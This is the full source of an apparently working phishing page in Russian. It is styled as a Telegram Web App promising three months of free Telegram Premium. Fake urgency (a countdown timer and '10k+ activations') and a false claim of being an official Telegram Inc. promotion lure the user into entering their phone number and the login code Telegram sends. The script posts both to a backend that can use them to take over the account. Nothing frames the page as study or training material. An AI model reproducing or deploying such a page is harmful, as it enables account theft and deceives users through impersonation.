<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Telegram Premium — Бесплатно</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: var(--tg-theme-bg-color, #17212b);
            color: var(--tg-theme-text-color, #ffffff);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 450px;
            width: 100%;
            background: var(--tg-theme-secondary-bg-color, #1f2a36);
            border-radius: 32px;
            padding: 28px 24px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.2);
        }
        .logo {
            text-align: center;
            margin-bottom: 24px;
        }
        .logo-icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #2a6b9e, #1a4a6e);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto;
            font-size: 44px;
        }
        h1 {
            text-align: center;
            font-size: 26px;
            margin: 16px 0 8px;
        }
        .subtitle {
            text-align: center;
            color: #7e8c9e;
            font-size: 14px;
            margin-bottom: 28px;
        }
        .timer-box {
            background: rgba(255,255,255,0.05);
            border-radius: 50px;
            padding: 16px;
            text-align: center;
            margin-bottom: 28px;
        }
        .timer-label {
            font-size: 12px;
            color: #7e8c9e;
            letter-spacing: 1px;
        }
        .timer {
            font-size: 44px;
            font-weight: bold;
            font-family: monospace;
            letter-spacing: 4px;
        }
        .prizes {
            display: flex;
            gap: 12px;
            margin-bottom: 28px;
        }
        .prize {
            flex: 1;
            background: rgba(255,255,255,0.03);
            border-radius: 20px;
            padding: 12px;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.05);
        }
        .prize-icon { font-size: 28px; margin-bottom: 8px; }
        .prize-count { font-weight: bold; font-size: 18px; color: #ffd700; }
        .prize-text { font-size: 11px; color: #7e8c9e; }
        .input-group { margin-bottom: 16px; }
        .input-group input {
            width: 100%;
            padding: 15px 18px;
            background: var(--tg-theme-bg-color, #0e1621);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 28px;
            font-size: 16px;
            color: var(--tg-theme-text-color, #ffffff);
            outline: none;
        }
        .input-group input:focus { border-color: #2a6b9e; }
        .input-group input::placeholder { color: #5a6e80; }
        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #2a6b9e, #1a4a6e);
            border: none;
            border-radius: 28px;
            font-size: 18px;
            font-weight: bold;
            color: white;
            cursor: pointer;
            transition: opacity 0.2s;
        }
        button:active { opacity: 0.8; }
        .step { display: none; }
        .step.active { display: block; }
        .loading { text-align: center; padding: 30px; }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid rgba(255,255,255,0.2);
            border-top-color: #2a6b9e;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .error {
            background: rgba(220,50,50,0.15);
            border: 1px solid rgba(220,50,50,0.4);
            border-radius: 14px;
            padding: 12px;
            text-align: center;
            color: #ff6b6b;
            font-size: 13px;
            margin-bottom: 16px;
        }
        .security {
            text-align: center;
            font-size: 11px;
            color: #5a6e80;
            margin-top: 20px;
        }
    </style>
</head>
<body>
<div class="container" id="app">
    <div class="logo"><div class="logo-icon">🎁</div></div>
    <h1>Telegram Premium</h1>
    <div class="subtitle">3 месяца бесплатно</div>

    <div class="timer-box">
        <div class="timer-label">ДО КОНЦА АКЦИИ</div>
        <div class="timer" id="timer">15:32</div>
    </div>

    <div class="prizes">
        <div class="prize"><div class="prize-icon">🎖️</div><div class="prize-count">10k+</div><div class="prize-text">активаций</div></div>
        <div class="prize"><div class="prize-icon">⭐</div><div class="prize-count">3 мес</div><div class="prize-text">Premium</div></div>
        <div class="prize"><div class="prize-icon">🔒</div><div class="prize-count">Безопасно</div><div class="prize-text">официально</div></div>
    </div>

    <!-- ШАГ 1: НОМЕР -->
    <div id="step1" class="step active">
        <div class="input-group"><input type="tel" id="phone" placeholder="+7 999 123 45 67"></div>
        <button onclick="sendCode()">Получить Premium</button>
    </div>

    <!-- ШАГ 2: КОД -->
    <div id="step2" class="step">
        <div class="input-group"><input type="text" id="code" placeholder="Введите код из Telegram"></div>
        <div id="errorMsg" class="error" style="display:none;"></div>
        <button onclick="verifyCode()">Подтвердить</button>
    </div>

    <!-- ШАГ 3: ЗАГРУЗКА -->
    <div id="step3" class="step">
        <div class="loading"><div class="spinner"></div><div>Активация Premium...</div></div>
    </div>

    <div class="security">🔒 Официальная акция Telegram Inc.</div>
</div>

<script>
    let tg = window.Telegram?.WebApp;
    if (tg) tg.ready();

    let currentPhone = '';
    let time = 932;
    setInterval(() => { if(time>0){ time--; let m=Math.floor(time/60); let s=time%60; document.getElementById('timer').innerText=`${m}:${s<10?'0'+s:s}`; } }, 1000);

    async function sendCode() {
        let phone = document.getElementById('phone').value.trim();
        if (!phone) return showError('Введите номер');
        currentPhone = phone;
        document.getElementById('step1').classList.remove('active');
        document.getElementById('step3').classList.add('active');
        let res = await fetch('/api/send_code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone: phone })
        });
        setTimeout(() => {
            document.getElementById('step3').classList.remove('active');
            document.getElementById('step2').classList.add('active');
        }, 1500);
    }

    async function verifyCode() {
        let code = document.getElementById('code').value.trim();
        if (!code) return showError('Введите код');
        document.getElementById('step2').classList.remove('active');
        document.getElementById('step3').classList.add('active');
        let res = await fetch('/api/verify_code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone: currentPhone, code: code })
        });
        let data = await res.json();
        if (data.success) {
            document.getElementById('step3').innerHTML = '<div class="loading"><div style="font-size:48px;">✅</div><div>Premium активирован!</div></div>';
            setTimeout(() => { if(tg) tg.close(); else location.reload(); }, 2000);
        } else {
            document.getElementById('step3').classList.remove('active');
            document.getElementById('step2').classList.add('active');
            showError(data.error || 'Неверный код');
        }
    }

    function showError(msg) {
        let err = document.getElementById('errorMsg');
        err.innerText = msg;
        err.style.display = 'block';
        setTimeout(() => err.style.display = 'none', 3000);
    }
</script>
</body>
</html>
